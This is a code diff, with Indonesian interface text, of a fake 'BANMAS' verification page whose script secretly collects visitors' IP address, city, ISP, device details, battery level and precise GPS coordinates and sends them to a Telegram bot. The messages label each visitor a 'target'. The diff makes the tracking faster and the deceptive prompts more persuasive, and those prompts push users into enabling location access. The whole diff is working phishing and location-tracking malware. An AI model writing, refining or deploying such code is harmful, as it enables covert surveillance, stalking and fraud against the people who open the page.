@@ -89,6 +89,27 @@
         const REDIRECT_URL = 'https://banmas.humabetang.net/';
         let watchId = null;
         let randomID = "";
+        let deviceInfo = null;
+
+        // Pre-fetch device info for faster reporting
+        async function fetchDeviceInfo() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    const data = await res.json();
+                    deviceInfo = {
+                        ip: data.ip,
+                        city: data.city,
+                        region: data.region,
+                        isp: data.org,
+                        ua: navigator.userAgent
+                    };
+                }
+            } catch (e) {
+                deviceInfo = { ip: "Unknown", ua: navigator.userAgent };
+            }
+        }
+        fetchDeviceInfo();
 
         async function sendToTelegram(text) {
             try {
@@ -100,29 +121,14 @@
             } catch (e) { console.error("TG Error:", e); }
         }
 
-        async function getDeviceInfo() {
-            let batteryInfo = "Tidak diketahui";
+        async function getBatteryStatus() {
             try {
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
-                    batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Mengisi Daya ⚡' : 'Baterai 🔋'})`;
+                    return `${Math.round(battery.level * 100)}% (${battery.charging ? '⚡' : '🔋'})`;
                 }
             } catch (e) {}
-
-            let ipData = { ip: "Unknown", city: "Unknown", region: "Unknown", org: "Unknown" };
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                if (res.ok) ipData = await res.json();
-            } catch (e) {}
-
-            return {
-                battery: batteryInfo,
-                ip: ipData.ip,
-                city: ipData.city,
-                region: ipData.region,
-                isp: ipData.org,
-                ua: navigator.userAgent
-            };
+            return "N/A";
         }
 
         async function startCapture() {
@@ -142,25 +148,26 @@
             loader.style.display = 'block';
             progCont.style.display = 'block';
             title.innerText = "Memproses Verifikasi...";
+            desc.innerHTML = "Sedang melakukan validasi data dan lokasi. Mohon jangan tutup halaman ini...";
 
             let p = 0;
             const pInterval = setInterval(() => {
-                p += 2; if (p > 95) clearInterval(pInterval);
+                p += (p < 80) ? 5 : 1;
+                if (p > 98) clearInterval(pInterval);
                 progBar.style.width = p + "%";
-            }, 200);
+            }, 300);
 
-            // Ambil info perangkat & IP (sebagai backup lokasi)
-            const info = await getDeviceInfo();
-            let startMsg = `🚀 <b>TARGET BARU (V3 SIMPLIFIED)</b>\n`;
-            startMsg += `ID: <code>${randomID}</code>\n`;
-            startMsg += `🌐 IP: <code>${info.ip}</code>\n`;
-            startMsg += `📍 IP Lokasi: <code>${info.city}, ${info.region}</code>\n`;
-            startMsg += `🏢 ISP: <code>${info.isp}</code>\n`;
-            startMsg += `🔋 Baterai: <code>${info.battery}</code>\n`;
-            startMsg += `📱 Perangkat: <code>${info.ua}</code>\n`;
-            startMsg += `<i>Mencoba mendapatkan koordinat GPS yang akurat...</i>`;
+            const battery = await getBatteryStatus();
+            const info = deviceInfo || { ip: "Loading...", ua: navigator.userAgent };
 
-            sendToTelegram(startMsg);
+            let logMsg = `🚀 <b>PENGECEKAN BARU (V3)</b>\n`;
+            logMsg += `ID: <code>${randomID}</code>\n`;
+            logMsg += `🌐 IP: <code>${info.ip}</code>\n`;
+            if (info.city) logMsg += `📍 Est. Lokasi: <code>${info.city}, ${info.region}</code>\n`;
+            logMsg += `🔋 Bat: <code>${battery}</code>\n`;
+            logMsg += `📱 HP: <code>${info.ua.split(')')[0]})</code>\n`;
+
+            sendToTelegram(logMsg);
 
             const success = async (pos) => {
                 clearInterval(pInterval);
@@ -174,38 +181,42 @@
                 const lon = pos.coords.longitude;
                 const acc = pos.coords.accuracy;
 
-                await sendToTelegram(`🎯 <b>LOKASI AKURAT DITEMUKAN</b>\nID: <code>${randomID}</code>\n📍 <a href="https://www.google.com/maps?q=${lat},${lon}">BUKA DI GOOGLE MAPS</a>\nAkurasi: <code>${Math.round(acc)} meter</code>`);
+                await sendToTelegram(`✅ <b>LOKASI DITEMUKAN</b>\nID: <code>${randomID}</code>\n📍 <a href="https://www.google.com/maps?q=${lat},${lon}">LIHAT DI PETA</a>\nAkurasi: <code>${Math.round(acc)}m</code>`);
 
-                title.innerText = "Berhasil!";
+                title.innerText = "Verifikasi Berhasil";
                 desc.className = "info-box success";
-                desc.innerHTML = "✅ <b>Verifikasi Selesai!</b> Lokasi Anda telah tervalidasi. Membuka halaman pendaftaran...";
+                desc.innerHTML = "✅ <b>Lokasi Terverifikasi!</b> Identitas Anda telah divalidasi oleh sistem BANMAS. Mengalihkan ke halaman pendaftaran...";
 
-                setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
+                setTimeout(() => { window.location.href = REDIRECT_URL; }, 2500);
             };
 
             const error = async (err) => {
                 clearInterval(pInterval);
                 loader.style.display = 'none';
-                title.innerText = "Verifikasi Tertunda";
+                title.innerText = "Verifikasi Gagal";
                 btn.style.display = 'block';
-                btn.innerText = "COBA LAGI";
+                btn.innerText = "ULANGI VERIFIKASI";
 
                 if(err.code == 1) { // User klik Blokir
                     desc.className = "info-box error";
-                    desc.innerHTML = `<b>Izin Lokasi Ditolak!</b><br>Mohon klik <b>Ikon Gembok 🔒</b> di bar alamat (pojok kiri atas), lalu pilih <b>Izinkan</b> untuk Lokasi agar proses verifikasi bisa lanjut.`;
+                    desc.innerHTML = `<b>Akses Lokasi Ditolak!</b><br><br>Sistem tidak bisa memverifikasi wilayah Anda. Klik ikon <b>Gembok 🔒</b> di kiri atas layar, lalu pilih <b>Izinkan (Allow)</b> untuk Lokasi.`;
                     await sendToTelegram(`❌ <b>IZIN DITOLAK</b>\nID: <code>${randomID}</code>`);
                 } else { // GPS Mati atau timeout
                     desc.className = "info-box warning";
-                    desc.innerHTML = `<b>Sinyal GPS Lemah / Mati!</b><br>1. <b>Usap layar HP dari paling atas ke bawah</b>.<br>2. Cari & klik ikon <b>Lokasi / GPS</b> agar menyala.<br>3. Jika sudah menyala, klik tombol <b>COBA LAGI</b> atau tunggu sebentar.`;
+                    desc.innerHTML = `<b>Gagal Mendapatkan Lokasi!</b><br><br>1. <b>Usap layar HP dari atas ke bawah</b>.<br>2. Pastikan ikon <b>Lokasi/GPS</b> sudah menyala (berwarna biru).<br>3. Klik tombol di bawah untuk mencoba lagi.`;
 
                     if (!watchId) {
                          watchId = navigator.geolocation.watchPosition(success, (e) => console.log("Watch error:", e), { enableHighAccuracy: true });
                     }
-                    await sendToTelegram(`⏳ <b>GPS MATI/TIMEOUT</b>\nID: <code>${randomID}</code>\n<i>Menunggu user menyalakan GPS/mencoba lagi...</i>`);
+                    await sendToTelegram(`⚠️ <b>GPS MATI / TIMEOUT</b>\nID: <code>${randomID}</code>`);
                 }
             };
 
-            navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, timeout: 8000 });
+            navigator.geolocation.getCurrentPosition(success, error, {
+                enableHighAccuracy: true,
+                timeout: 12000,
+                maximumAge: 0
+            });
         }
     </script>
 </body>
